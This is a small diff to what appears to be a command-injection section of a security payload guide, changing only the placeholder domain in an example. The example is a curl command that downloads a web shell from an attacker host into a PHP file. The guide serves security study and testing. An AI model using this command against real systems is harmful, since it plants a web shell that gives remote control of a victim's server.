@@ -134,7 +134,7 @@ Sometimes, direct command execution from the injection might not be possible, bu
 
     ```ps1
     # -o, --output <file>        Write to file instead of stdout
-    curl http://evil.attacker.com/ -o webshell.php
+    curl http://[ATTACKER.DOMAIN.TLD]/ -o webshell.php
     ```
 
 ### Inside A Command
